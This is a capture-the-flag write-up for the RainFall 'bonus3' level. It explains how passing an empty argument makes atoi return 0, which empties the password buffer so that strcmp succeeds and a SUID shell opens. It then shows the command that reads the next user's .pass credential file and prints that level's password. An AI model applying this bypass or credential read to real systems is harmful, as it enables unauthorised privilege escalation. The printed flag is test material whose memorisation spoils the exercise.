# bonus3: Exploiting atoi Behavior for strcmp Bypass

## Challenge Overview

The `bonus3` program reads content from `/home/user/end/.pass`, takes a single command-line argument, and compares a portion of the file content against the argument. If they match, it grants a shell. The goal is to bypass this check to gain access to the `end` user account.

## Source Code Analysis

The program reads the first 66 bytes from the password file into `password_buffer`. It then uses the command-line argument (`argv[1]`) in a critical sequence:

```c
// Convert argument to integer
password_len_arg = atoi(argv[1]);

// Place null terminator based on integer value
password_buffer[password_len_arg] = '\0';

// ...

// Compare potentially truncated buffer with original argument
comparison_result = strcmp(password_buffer, argv[1]);

if (comparison_result == 0) {
    // Grant shell if match
    execl("/bin/sh", "sh", (char *)NULL);
} else {
    // Print second part of file (often empty due to side effects)
    puts(message_buffer);
}
```
The code also contains buffer overflows (`memset`, first `fread`) and logic that often results in `puts(message_buffer)` printing nothing, which initially caused some confusion during analysis. Debugging was hampered by the SUID nature of the binary preventing direct GDB inspection of file reads.

The primary goal for exploitation is to make the `strcmp` comparison succeed, thereby triggering the `execl` call and granting a shell. To achieve this, we must leverage the program's use of `atoi` on the command-line argument and the subsequent null termination of the password buffer.


## Vulnerability

The primary vulnerability lies in the interaction between `atoi`, the null termination, and `strcmp`. Specifically:
*   `atoi("")` (when `argv[1]` is an empty string) typically returns `0`.
*   This causes `password_buffer[0] = '\0';` to execute.
*   This effectively makes `password_buffer` an empty string, regardless of the file content read by `fread`.
*   The subsequent `strcmp(password_buffer, argv[1])` becomes `strcmp("", "")`.
*   `strcmp` returns `0` for identical strings, including two empty strings.

This allows bypassing the comparison logic without needing to know the password file's content or relying on the buffer overflows.

## Exploitation

The exploit involves running the program with an empty string as the command-line argument. This triggers the vulnerability described above, causing the `strcmp` to return 0 and the program to execute `/bin/sh`.

```bash
bonus3@RainFall:~$ ./bonus3 ""
```

## Getting the Password

Once the exploit successfully grants a shell, the password for the `end` user can be read from their home directory:

```bash
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ exit
```

## Moving to Next Level

Use the obtained password to switch to the `end` user account:

```bash
bonus3@RainFall:~$ su end
Password: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
end@RainFall:~$
